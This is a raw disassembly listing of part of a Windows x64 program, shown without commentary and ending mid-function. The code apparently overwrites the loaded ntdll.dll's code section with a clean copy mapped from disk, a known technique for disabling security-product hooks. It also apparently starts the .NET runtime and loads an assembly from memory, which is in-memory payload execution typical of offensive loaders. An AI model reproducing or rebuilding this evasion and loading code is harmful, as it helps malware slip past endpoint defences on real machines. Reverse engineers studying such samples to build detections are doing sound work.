   14000175c:	ff 15 ee 18 01 00    	call   *0x118ee(%rip)        # 0x140013050
   140001762:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001767:	ba 01 00 00 00       	mov    $0x1,%edx
   14000176c:	ff 15 b6 18 01 00    	call   *0x118b6(%rip)        # 0x140013028
   140001772:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140001777:	e9 8f 00 00 00       	jmp    0x14000180b
   14000177c:	ff 15 ce 18 01 00    	call   *0x118ce(%rip)        # 0x140013050
   140001782:	48 8b 95 78 01 00 00 	mov    0x178(%rbp),%rdx
   140001789:	48 8d 85 20 06 00 00 	lea    0x620(%rbp),%rax
   140001790:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001795:	4c 8d 85 18 06 00 00 	lea    0x618(%rbp),%r8
   14000179c:	48 83 c2 10          	add    $0x10,%rdx
   1400017a0:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400017a5:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   1400017ab:	ff 15 37 d3 01 00    	call   *0x1d337(%rip)        # 0x14001eae8
   1400017b1:	85 c0                	test   %eax,%eax
   1400017b3:	74 ad                	je     0x140001762
   1400017b5:	8b 85 10 06 00 00    	mov    0x610(%rbp),%eax
   1400017bb:	48 8d 95 f0 00 00 00 	lea    0xf0(%rbp),%rdx
   1400017c2:	48 03 85 18 06 00 00 	add    0x618(%rbp),%rax
   1400017c9:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400017ce:	48 89 85 70 01 00 00 	mov    %rax,0x170(%rbp)
   1400017d5:	ff 15 f5 d2 01 00    	call   *0x1d2f5(%rip)        # 0x14001ead0
   1400017db:	85 c0                	test   %eax,%eax
   1400017dd:	74 83                	je     0x140001762
   1400017df:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400017e4:	ff 15 ee d2 01 00    	call   *0x1d2ee(%rip)        # 0x14001ead8
   1400017ea:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400017ed:	0f 84 6f ff ff ff    	je     0x140001762
   1400017f3:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400017f8:	ff 15 22 18 01 00    	call   *0x11822(%rip)        # 0x140013020
   1400017fe:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001803:	ff 15 17 18 01 00    	call   *0x11817(%rip)        # 0x140013020
   140001809:	33 c0                	xor    %eax,%eax
   14000180b:	4c 8b b4 24 c8 06 00 	mov    0x6c8(%rsp),%r14
   140001812:	00 
   140001813:	4c 8b ac 24 d0 06 00 	mov    0x6d0(%rsp),%r13
   14000181a:	00 
   14000181b:	48 81 c4 d8 06 00 00 	add    $0x6d8,%rsp
   140001822:	41 5f                	pop    %r15
   140001824:	41 5c                	pop    %r12
   140001826:	5f                   	pop    %rdi
   140001827:	5e                   	pop    %rsi
   140001828:	5b                   	pop    %rbx
   140001829:	5d                   	pop    %rbp
   14000182a:	c3                   	ret
   14000182b:	cc                   	int3
   14000182c:	cc                   	int3
   14000182d:	cc                   	int3
   14000182e:	cc                   	int3
   14000182f:	cc                   	int3
   140001830:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001835:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000183a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000183f:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140001844:	49 8b f1             	mov    %r9,%rsi
   140001847:	4d 8b f0             	mov    %r8,%r14
   14000184a:	44 8b da             	mov    %edx,%r11d
   14000184d:	48 8b f9             	mov    %rcx,%rdi
   140001850:	81 fa 3c 04 00 00    	cmp    $0x43c,%edx
   140001856:	0f 82 25 01 00 00    	jb     0x140001981
   14000185c:	8b da                	mov    %edx,%ebx
   14000185e:	44 8d 52 c4          	lea    -0x3c(%rdx),%r10d
   140001862:	d1 eb                	shr    $1,%ebx
   140001864:	44 3b d3             	cmp    %ebx,%r10d
   140001867:	0f 86 14 01 00 00    	jbe    0x140001981
   14000186d:	0f 1f 00             	nopl   (%rax)
   140001870:	41 8b c2             	mov    %r10d,%eax
   140001873:	48 03 c7             	add    %rdi,%rax
   140001876:	83 78 04 20          	cmpl   $0x20,0x4(%rax)
   14000187a:	0f 85 f5 00 00 00    	jne    0x140001975
   140001880:	44 8b 40 08          	mov    0x8(%rax),%r8d
   140001884:	45 85 c0             	test   %r8d,%r8d
   140001887:	0f 84 e8 00 00 00    	je     0x140001975
   14000188d:	45 3b c3             	cmp    %r11d,%r8d
   140001890:	0f 83 df 00 00 00    	jae    0x140001975
   140001896:	44 8b 48 0c          	mov    0xc(%rax),%r9d
   14000189a:	45 85 c9             	test   %r9d,%r9d
   14000189d:	0f 84 d2 00 00 00    	je     0x140001975
   1400018a3:	45 3b cb             	cmp    %r11d,%r9d
   1400018a6:	0f 83 c9 00 00 00    	jae    0x140001975
   1400018ac:	0f b6 48 2e          	movzbl 0x2e(%rax),%ecx
   1400018b0:	0f b6 50 2f          	movzbl 0x2f(%rax),%edx
   1400018b4:	03 d1                	add    %ecx,%edx
   1400018b6:	0f b6 48 2d          	movzbl 0x2d(%rax),%ecx
   1400018ba:	03 d1                	add    %ecx,%edx
   1400018bc:	0f b6 48 2c          	movzbl 0x2c(%rax),%ecx
   1400018c0:	03 d1                	add    %ecx,%edx
   1400018c2:	0f b6 48 2b          	movzbl 0x2b(%rax),%ecx
   1400018c6:	03 d1                	add    %ecx,%edx
   1400018c8:	0f b6 48 2a          	movzbl 0x2a(%rax),%ecx
   1400018cc:	03 d1                	add    %ecx,%edx
   1400018ce:	0f b6 48 29          	movzbl 0x29(%rax),%ecx
   1400018d2:	03 d1                	add    %ecx,%edx
   1400018d4:	0f b6 48 28          	movzbl 0x28(%rax),%ecx
   1400018d8:	03 d1                	add    %ecx,%edx
   1400018da:	0f b6 48 27          	movzbl 0x27(%rax),%ecx
   1400018de:	03 d1                	add    %ecx,%edx
   1400018e0:	0f b6 48 26          	movzbl 0x26(%rax),%ecx
   1400018e4:	03 d1                	add    %ecx,%edx
   1400018e6:	0f b6 48 25          	movzbl 0x25(%rax),%ecx
   1400018ea:	03 d1                	add    %ecx,%edx
   1400018ec:	0f b6 48 24          	movzbl 0x24(%rax),%ecx
   1400018f0:	03 d1                	add    %ecx,%edx
   1400018f2:	0f b6 48 23          	movzbl 0x23(%rax),%ecx
   1400018f6:	03 d1                	add    %ecx,%edx
   1400018f8:	0f b6 48 22          	movzbl 0x22(%rax),%ecx
   1400018fc:	03 d1                	add    %ecx,%edx
   1400018fe:	0f b6 48 21          	movzbl 0x21(%rax),%ecx
   140001902:	03 d1                	add    %ecx,%edx
   140001904:	0f b6 48 20          	movzbl 0x20(%rax),%ecx
   140001908:	03 d1                	add    %ecx,%edx
   14000190a:	0f b6 48 1f          	movzbl 0x1f(%rax),%ecx
   14000190e:	03 d1                	add    %ecx,%edx
   140001910:	0f b6 48 1e          	movzbl 0x1e(%rax),%ecx
   140001914:	03 d1                	add    %ecx,%edx
   140001916:	0f b6 48 1d          	movzbl 0x1d(%rax),%ecx
   14000191a:	03 d1                	add    %ecx,%edx
   14000191c:	0f b6 48 1c          	movzbl 0x1c(%rax),%ecx
   140001920:	03 d1                	add    %ecx,%edx
   140001922:	0f b6 48 1b          	movzbl 0x1b(%rax),%ecx
   140001926:	03 d1                	add    %ecx,%edx
   140001928:	0f b6 48 1a          	movzbl 0x1a(%rax),%ecx
   14000192c:	03 d1                	add    %ecx,%edx
   14000192e:	0f b6 48 19          	movzbl 0x19(%rax),%ecx
   140001932:	03 d1                	add    %ecx,%edx
   140001934:	0f b6 48 18          	movzbl 0x18(%rax),%ecx
   140001938:	03 d1                	add    %ecx,%edx
   14000193a:	0f b6 48 17          	movzbl 0x17(%rax),%ecx
   14000193e:	03 d1                	add    %ecx,%edx
   140001940:	0f b6 48 16          	movzbl 0x16(%rax),%ecx
   140001944:	03 d1                	add    %ecx,%edx
   140001946:	0f b6 48 15          	movzbl 0x15(%rax),%ecx
   14000194a:	03 d1                	add    %ecx,%edx
   14000194c:	0f b6 48 14          	movzbl 0x14(%rax),%ecx
   140001950:	03 d1                	add    %ecx,%edx
   140001952:	0f b6 48 13          	movzbl 0x13(%rax),%ecx
   140001956:	03 d1                	add    %ecx,%edx
   140001958:	0f b6 48 12          	movzbl 0x12(%rax),%ecx
   14000195c:	03 d1                	add    %ecx,%edx
   14000195e:	0f b6 48 11          	movzbl 0x11(%rax),%ecx
   140001962:	03 d1                	add    %ecx,%edx
   140001964:	0f b6 48 10          	movzbl 0x10(%rax),%ecx
   140001968:	03 d1                	add    %ecx,%edx
   14000196a:	41 33 d1             	xor    %r9d,%edx
   14000196d:	41 33 d0             	xor    %r8d,%edx
   140001970:	3b 50 38             	cmp    0x38(%rax),%edx
   140001973:	74 23                	je     0x140001998
   140001975:	41 ff ca             	dec    %r10d
   140001978:	44 3b d3             	cmp    %ebx,%r10d
   14000197b:	0f 87 ef fe ff ff    	ja     0x140001870
   140001981:	32 c0                	xor    %al,%al
   140001983:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   140001988:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
   14000198d:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   140001992:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   140001997:	c3                   	ret
   140001998:	49 89 06             	mov    %rax,(%r14)
   14000199b:	8b 48 0c             	mov    0xc(%rax),%ecx
   14000199e:	b0 01                	mov    $0x1,%al
   1400019a0:	89 0e                	mov    %ecx,(%rsi)
   1400019a2:	eb df                	jmp    0x140001983
   1400019a4:	cc                   	int3
   1400019a5:	cc                   	int3
   1400019a6:	cc                   	int3
   1400019a7:	cc                   	int3
   1400019a8:	cc                   	int3
   1400019a9:	cc                   	int3
   1400019aa:	cc                   	int3
   1400019ab:	cc                   	int3
   1400019ac:	cc                   	int3
   1400019ad:	cc                   	int3
   1400019ae:	cc                   	int3
   1400019af:	cc                   	int3
   1400019b0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400019b5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400019ba:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400019bf:	55                   	push   %rbp
   1400019c0:	41 56                	push   %r14
   1400019c2:	41 57                	push   %r15
   1400019c4:	48 8d 6c 24 a0       	lea    -0x60(%rsp),%rbp
   1400019c9:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   1400019d0:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400019d5:	c7 44 24 40 6e 74 64 	movl   $0x6c64746e,0x40(%rsp)
   1400019dc:	6c 
   1400019dd:	c7 44 24 44 6c 2e 64 	movl   $0x6c642e6c,0x44(%rsp)
   1400019e4:	6c 
   1400019e5:	66 c7 44 24 48 6c 00 	movw   $0x6c,0x48(%rsp)
   1400019ec:	ff 15 9e 16 01 00    	call   *0x1169e(%rip)        # 0x140013090
   1400019f2:	4c 8b f8             	mov    %rax,%r15
   1400019f5:	48 85 c0             	test   %rax,%rax
   1400019f8:	0f 84 c5 00 00 00    	je     0x140001ac3
   1400019fe:	ba 04 01 00 00       	mov    $0x104,%edx
   140001a03:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001a08:	ff 15 2a 16 01 00    	call   *0x1162a(%rip)        # 0x140013038
   140001a0e:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001a13:	48 ff c9             	dec    %rcx
   140001a16:	80 79 01 00          	cmpb   $0x0,0x1(%rcx)
   140001a1a:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   140001a1e:	75 f6                	jne    0x140001a16
   140001a20:	0f b7 05 59 1a 01 00 	movzwl 0x11a59(%rip),%eax        # 0x140013480
   140001a27:	66 89 01             	mov    %ax,(%rcx)
   140001a2a:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001a2f:	48 ff c9             	dec    %rcx
   140001a32:	80 79 01 00          	cmpb   $0x0,0x1(%rcx)
   140001a36:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   140001a3a:	75 f6                	jne    0x140001a32
   140001a3c:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140001a41:	33 d2                	xor    %edx,%edx
   140001a43:	0f 1f 40 00          	nopl   0x0(%rax)
   140001a47:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140001a4e:	00 00 
   140001a50:	41 0f b6 04 10       	movzbl (%r8,%rdx,1),%eax
   140001a55:	88 04 11             	mov    %al,(%rcx,%rdx,1)
   140001a58:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   140001a5c:	84 c0                	test   %al,%al
   140001a5e:	75 f0                	jne    0x140001a50
   140001a60:	33 db                	xor    %ebx,%ebx
   140001a62:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001a67:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001a6c:	45 33 c9             	xor    %r9d,%r9d
   140001a6f:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140001a73:	ba 00 00 00 80       	mov    $0x80000000,%edx
   140001a78:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001a7e:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   140001a85:	00 
   140001a86:	ff 15 74 15 01 00    	call   *0x11574(%rip)        # 0x140013000
   140001a8c:	48 8b f8             	mov    %rax,%rdi
   140001a8f:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140001a93:	74 2e                	je     0x140001ac3
   140001a95:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140001a9a:	45 33 c9             	xor    %r9d,%r9d
   140001a9d:	33 d2                	xor    %edx,%edx
   140001a9f:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140001aa3:	41 b8 02 00 00 01    	mov    $0x1000002,%r8d
   140001aa9:	48 8b c8             	mov    %rax,%rcx
   140001aac:	ff 15 f6 15 01 00    	call   *0x115f6(%rip)        # 0x1400130a8
   140001ab2:	48 8b f0             	mov    %rax,%rsi
   140001ab5:	48 85 c0             	test   %rax,%rax
   140001ab8:	75 28                	jne    0x140001ae2
   140001aba:	48 8b cf             	mov    %rdi,%rcx
   140001abd:	ff 15 5d 15 01 00    	call   *0x1155d(%rip)        # 0x140013020
   140001ac3:	32 c0                	xor    %al,%al
   140001ac5:	4c 8d 9c 24 60 01 00 	lea    0x160(%rsp),%r11
   140001acc:	00 
   140001acd:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140001ad1:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140001ad5:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   140001ad9:	49 8b e3             	mov    %r11,%rsp
   140001adc:	41 5f                	pop    %r15
   140001ade:	41 5e                	pop    %r14
   140001ae0:	5d                   	pop    %rbp
   140001ae1:	c3                   	ret
   140001ae2:	45 33 c9             	xor    %r9d,%r9d
   140001ae5:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001aea:	45 33 c0             	xor    %r8d,%r8d
   140001aed:	ba 04 00 00 00       	mov    $0x4,%edx
   140001af2:	48 8b ce             	mov    %rsi,%rcx
   140001af5:	ff 15 5d 15 01 00    	call   *0x1155d(%rip)        # 0x140013058
   140001afb:	48 8b ce             	mov    %rsi,%rcx
   140001afe:	4c 8b f0             	mov    %rax,%r14
   140001b01:	ff 15 19 15 01 00    	call   *0x11519(%rip)        # 0x140013020
   140001b07:	48 8b cf             	mov    %rdi,%rcx
   140001b0a:	ff 15 10 15 01 00    	call   *0x11510(%rip)        # 0x140013020
   140001b10:	4d 85 f6             	test   %r14,%r14
   140001b13:	74 ae                	je     0x140001ac3
   140001b15:	49 63 4e 3c          	movslq 0x3c(%r14),%rcx
   140001b19:	49 03 ce             	add    %r14,%rcx
   140001b1c:	44 0f b7 49 14       	movzwl 0x14(%rcx),%r9d
   140001b21:	0f b7 51 06          	movzwl 0x6(%rcx),%edx
   140001b25:	4c 03 c9             	add    %rcx,%r9
   140001b28:	66 3b da             	cmp    %dx,%bx
   140001b2b:	73 49                	jae    0x140001b76
   140001b2d:	c7 85 80 00 00 00 2e 	movl   $0x7865742e,0x80(%rbp)
   140001b34:	74 65 78 
   140001b37:	44 8b 85 80 00 00 00 	mov    0x80(%rbp),%r8d
   140001b3e:	88 9d 85 00 00 00    	mov    %bl,0x85(%rbp)
   140001b44:	0f 1f 40 00          	nopl   0x0(%rax)
   140001b48:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001b4f:	00 
   140001b50:	0f b7 c3             	movzwl %bx,%eax
   140001b53:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140001b57:	48 8d 0c cd 00 00 00 	lea    0x0(,%rcx,8),%rcx
   140001b5e:	00 
   140001b5f:	46 39 44 09 18       	cmp    %r8d,0x18(%rcx,%r9,1)
   140001b64:	75 08                	jne    0x140001b6e
   140001b66:	42 80 7c 09 1c 74    	cmpb   $0x74,0x1c(%rcx,%r9,1)
   140001b6c:	74 1b                	je     0x140001b89
   140001b6e:	66 ff c3             	inc    %bx
   140001b71:	66 3b da             	cmp    %dx,%bx
   140001b74:	72 da                	jb     0x140001b50
   140001b76:	32 db                	xor    %bl,%bl
   140001b78:	49 8b ce             	mov    %r14,%rcx
   140001b7b:	ff 15 df 14 01 00    	call   *0x114df(%rip)        # 0x140013060
   140001b81:	0f b6 c3             	movzbl %bl,%eax
   140001b84:	e9 3c ff ff ff       	jmp    0x140001ac5
   140001b89:	41 8b 74 09 24       	mov    0x24(%r9,%rcx,1),%esi
   140001b8e:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140001b94:	41 8b 7c 09 20       	mov    0x20(%r9,%rcx,1),%edi
   140001b99:	4c 8d 8d 80 00 00 00 	lea    0x80(%rbp),%r9
   140001ba0:	8b d7                	mov    %edi,%edx
   140001ba2:	4a 8d 1c 3e          	lea    (%rsi,%r15,1),%rbx
   140001ba6:	48 8b cb             	mov    %rbx,%rcx
   140001ba9:	ff 15 99 14 01 00    	call   *0x11499(%rip)        # 0x140013048
   140001baf:	85 c0                	test   %eax,%eax
   140001bb1:	74 c3                	je     0x140001b76
   140001bb3:	4a 8d 14 36          	lea    (%rsi,%r14,1),%rdx
   140001bb7:	44 8b c7             	mov    %edi,%r8d
   140001bba:	48 8b cb             	mov    %rbx,%rcx
   140001bbd:	e8 ce f5 00 00       	call   0x140011190
   140001bc2:	44 8b 85 80 00 00 00 	mov    0x80(%rbp),%r8d
   140001bc9:	4c 8d 8d 80 00 00 00 	lea    0x80(%rbp),%r9
   140001bd0:	8b d7                	mov    %edi,%edx
   140001bd2:	48 8b cb             	mov    %rbx,%rcx
   140001bd5:	ff 15 6d 14 01 00    	call   *0x1146d(%rip)        # 0x140013048
   140001bdb:	49 8b ce             	mov    %r14,%rcx
   140001bde:	b3 01                	mov    $0x1,%bl
   140001be0:	ff 15 7a 14 01 00    	call   *0x1147a(%rip)        # 0x140013060
   140001be6:	0f b6 c3             	movzbl %bl,%eax
   140001be9:	e9 d7 fe ff ff       	jmp    0x140001ac5
   140001bee:	cc                   	int3
   140001bef:	cc                   	int3
   140001bf0:	48 8b c4             	mov    %rsp,%rax
   140001bf3:	55                   	push   %rbp
   140001bf4:	41 56                	push   %r14
   140001bf6:	41 57                	push   %r15
   140001bf8:	48 8d 68 a1          	lea    -0x5f(%rax),%rbp
   140001bfc:	48 81 ec 00 01 00 00 	sub    $0x100,%rsp
   140001c03:	44 8b f2             	mov    %edx,%r14d
   140001c06:	4c 8b f9             	mov    %rcx,%r15
   140001c09:	83 fa 40             	cmp    $0x40,%edx
   140001c0c:	0f 82 11 04 00 00    	jb     0x140002023
   140001c12:	48 85 c9             	test   %rcx,%rcx
   140001c15:	0f 84 08 04 00 00    	je     0x140002023
   140001c1b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140001c1f:	48 8d 4d c7          	lea    -0x39(%rbp),%rcx
   140001c23:	48 89 70 e0          	mov    %rsi,-0x20(%rax)
   140001c27:	48 89 78 d8          	mov    %rdi,-0x28(%rax)
   140001c2b:	4c 89 60 d0          	mov    %r12,-0x30(%rax)
   140001c2f:	45 32 e4             	xor    %r12b,%r12b
   140001c32:	4c 89 68 c8          	mov    %r13,-0x38(%rax)
   140001c36:	45 33 ed             	xor    %r13d,%r13d
   140001c39:	4c 89 6d 8f          	mov    %r13,-0x71(%rbp)
   140001c3d:	41 8b fd             	mov    %r13d,%edi
   140001c40:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140001c45:	41 8b dd             	mov    %r13d,%ebx
   140001c48:	4c 89 6d 87          	mov    %r13,-0x79(%rbp)
   140001c4c:	4c 89 6d 9f          	mov    %r13,-0x61(%rbp)
   140001c50:	4c 89 6c 24 38       	mov    %r13,0x38(%rsp)
   140001c55:	4c 89 6d 97          	mov    %r13,-0x69(%rbp)
   140001c59:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   140001c5e:	4c 89 6d a7          	mov    %r13,-0x59(%rbp)
   140001c62:	44 89 6d 6f          	mov    %r13d,0x6f(%rbp)
   140001c66:	ff 15 84 16 01 00    	call   *0x11684(%rip)        # 0x1400132f0
   140001c6c:	48 8d 4d 07          	lea    0x7(%rbp),%rcx
   140001c70:	ff 15 7a 16 01 00    	call   *0x1167a(%rip)        # 0x1400132f0
   140001c76:	48 8d 0d b3 18 01 00 	lea    0x118b3(%rip),%rcx        # 0x140013530
   140001c7d:	ff 15 1d 14 01 00    	call   *0x1141d(%rip)        # 0x1400130a0
   140001c83:	48 8b f0             	mov    %rax,%rsi
   140001c86:	48 85 c0             	test   %rax,%rax
   140001c89:	0f 84 bb 02 00 00    	je     0x140001f4a
   140001c8f:	48 8d 15 b2 18 01 00 	lea    0x118b2(%rip),%rdx        # 0x140013548
   140001c96:	48 8b c8             	mov    %rax,%rcx
   140001c99:	ff 15 f9 13 01 00    	call   *0x113f9(%rip)        # 0x140013098
   140001c9f:	48 85 c0             	test   %rax,%rax
   140001ca2:	0f 84 a2 02 00 00    	je     0x140001f4a
   140001ca8:	4c 8d 45 8f          	lea    -0x71(%rbp),%r8
   140001cac:	48 8d 15 7d 17 01 00 	lea    0x1177d(%rip),%rdx        # 0x140013430
   140001cb3:	48 8d 0d 66 17 01 00 	lea    0x11766(%rip),%rcx        # 0x140013420
   140001cba:	ff d0                	call   *%rax
   140001cbc:	85 c0                	test   %eax,%eax
   140001cbe:	0f 88 86 02 00 00    	js     0x140001f4a
   140001cc4:	48 8b 4d 8f          	mov    -0x71(%rbp),%rcx
   140001cc8:	48 85 c9             	test   %rcx,%rcx
   140001ccb:	0f 84 79 02 00 00    	je     0x140001f4a
   140001cd1:	48 8b 01             	mov    (%rcx),%rax
   140001cd4:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   140001cd9:	4c 8d 05 60 17 01 00 	lea    0x11760(%rip),%r8        # 0x140013440
   140001ce0:	48 8d 15 79 18 01 00 	lea    0x11879(%rip),%rdx        # 0x140013560
   140001ce7:	ff 50 18             	call   *0x18(%rax)
   140001cea:	85 c0                	test   %eax,%eax
   140001cec:	79 25                	jns    0x140001d13
   140001cee:	48 8b 4d 8f          	mov    -0x71(%rbp),%rcx
   140001cf2:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   140001cf7:	4c 8d 05 42 17 01 00 	lea    0x11742(%rip),%r8        # 0x140013440
   140001cfe:	48 8d 15 73 18 01 00 	lea    0x11873(%rip),%rdx        # 0x140013578
   140001d05:	48 8b 01             	mov    (%rcx),%rax
   140001d08:	ff 50 18             	call   *0x18(%rax)
   140001d0b:	85 c0                	test   %eax,%eax
   140001d0d:	0f 88 37 02 00 00    	js     0x140001f4a
   140001d13:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140001d18:	48 85 c9             	test   %rcx,%rcx
   140001d1b:	0f 84 29 02 00 00    	je     0x140001f4a
   140001d21:	48 8b 01             	mov    (%rcx),%rax
   140001d24:	48 8d 55 6f          	lea    0x6f(%rbp),%rdx
   140001d28:	ff 50 50             	call   *0x50(%rax)
   140001d2b:	85 c0                	test   %eax,%eax
   140001d2d:	0f 88 17 02 00 00    	js     0x140001f4a
   140001d33:	39 5d 6f             	cmp    %ebx,0x6f(%rbp)
   140001d36:	0f 84 0e 02 00 00    	je     0x140001f4a
   140001d3c:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140001d41:	4c 8d 4d 87          	lea    -0x79(%rbp),%r9
   140001d45:	4c 8d 05 14 17 01 00 	lea    0x11714(%rip),%r8        # 0x140013460
   140001d4c:	48 8d 15 fd 16 01 00 	lea    0x116fd(%rip),%rdx        # 0x140013450
   140001d53:	48 8b 01             	mov    (%rcx),%rax
   140001d56:	ff 50 48             	call   *0x48(%rax)
   140001d59:	85 c0                	test   %eax,%eax
   140001d5b:	0f 88 e9 01 00 00    	js     0x140001f4a
   140001d61:	48 8b 4d 87          	mov    -0x79(%rbp),%rcx
   140001d65:	48 85 c9             	test   %rcx,%rcx
   140001d68:	0f 84 dc 01 00 00    	je     0x140001f4a
   140001d6e:	48 8b 01             	mov    (%rcx),%rax
   140001d71:	ff 50 50             	call   *0x50(%rax)
   140001d74:	85 c0                	test   %eax,%eax
   140001d76:	0f 88 ce 01 00 00    	js     0x140001f4a
   140001d7c:	48 8b 4d 87          	mov    -0x79(%rbp),%rcx
   140001d80:	48 8d 55 9f          	lea    -0x61(%rbp),%rdx
   140001d84:	48 8b 01             	mov    (%rcx),%rax
   140001d87:	ff 50 68             	call   *0x68(%rax)
   140001d8a:	85 c0                	test   %eax,%eax
   140001d8c:	0f 88 b8 01 00 00    	js     0x140001f4a
   140001d92:	48 8b 4d 9f          	mov    -0x61(%rbp),%rcx
   140001d96:	48 85 c9             	test   %rcx,%rcx
   140001d99:	0f 84 ab 01 00 00    	je     0x140001f4a
   140001d9f:	48 8b 01             	mov    (%rcx),%rax
   140001da2:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140001da7:	48 8d 15 c2 16 01 00 	lea    0x116c2(%rip),%rdx        # 0x140013470
   140001dae:	ff 10                	call   *(%rax)
   140001db0:	85 c0                	test   %eax,%eax
   140001db2:	0f 88 92 01 00 00    	js     0x140001f4a
   140001db8:	48 39 5c 24 38       	cmp    %rbx,0x38(%rsp)
   140001dbd:	0f 84 87 01 00 00    	je     0x140001f4a
   140001dc3:	b9 11 00 00 00       	mov    $0x11,%ecx
   140001dc8:	45 8b c6             	mov    %r14d,%r8d
   140001dcb:	33 d2                	xor    %edx,%edx
   140001dcd:	ff 15 25 15 01 00    	call   *0x11525(%rip)        # 0x1400132f8
   140001dd3:	48 8b f8             	mov    %rax,%rdi
   140001dd6:	48 85 c0             	test   %rax,%rax
   140001dd9:	0f 84 6b 01 00 00    	je     0x140001f4a
   140001ddf:	48 8d 55 a7          	lea    -0x59(%rbp),%rdx
   140001de3:	48 8b c8             	mov    %rax,%rcx
   140001de6:	ff 15 24 15 01 00    	call   *0x11524(%rip)        # 0x140013310
   140001dec:	85 c0                	test   %eax,%eax
   140001dee:	0f 88 56 01 00 00    	js     0x140001f4a
   140001df4:	48 8b 4d a7          	mov    -0x59(%rbp),%rcx
   140001df8:	4d 8b c6             	mov    %r14,%r8
   140001dfb:	49 8b d7             	mov    %r15,%rdx
   140001dfe:	e8 8d f3 00 00       	call   0x140011190
   140001e03:	48 8b cf             	mov    %rdi,%rcx
   140001e06:	ff 15 24 15 01 00    	call   *0x11524(%rip)        # 0x140013330
   140001e0c:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140001e11:	4c 8d 45 97          	lea    -0x69(%rbp),%r8
   140001e15:	48 8b d7             	mov    %rdi,%rdx
   140001e18:	48 8b 01             	mov    (%rcx),%rax
   140001e1b:	ff 90 68 01 00 00    	call   *0x168(%rax)
   140001e21:	85 c0                	test   %eax,%eax
   140001e23:	0f 88 21 01 00 00    	js     0x140001f4a
   140001e29:	48 8b 4d 97          	mov    -0x69(%rbp),%rcx
   140001e2d:	48 85 c9             	test   %rcx,%rcx
   140001e30:	0f 84 14 01 00 00    	je     0x140001f4a
   140001e36:	48 8b 01             	mov    (%rcx),%rax
   140001e39:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140001e3e:	ff 90 80 00 00 00    	call   *0x80(%rax)
   140001e44:	85 c0                	test   %eax,%eax
   140001e46:	0f 88 fe 00 00 00    	js     0x140001f4a
   140001e4c:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140001e51:	48 85 c9             	test   %rcx,%rcx
   140001e54:	0f 84 f0 00 00 00    	je     0x140001f4a
   140001e5a:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   140001e5f:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   140001e64:	48 8b 01             	mov    (%rcx),%rax
   140001e67:	ff 90 90 00 00 00    	call   *0x90(%rax)
   140001e6d:	41 be 01 00 00 00    	mov    $0x1,%r14d
   140001e73:	85 c0                	test   %eax,%eax
   140001e75:	0f 88 97 00 00 00    	js     0x140001f12
   140001e7b:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140001e80:	48 85 c9             	test   %rcx,%rcx
   140001e83:	0f 84 89 00 00 00    	je     0x140001f12
   140001e89:	4c 8d 45 7f          	lea    0x7f(%rbp),%r8
   140001e8d:	41 8b d6             	mov    %r14d,%edx
   140001e90:	ff 15 82 14 01 00    	call   *0x11482(%rip)        # 0x140013318
   140001e96:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140001e9b:	4c 8d 45 77          	lea    0x77(%rbp),%r8
   140001e9f:	41 8b d6             	mov    %r14d,%edx
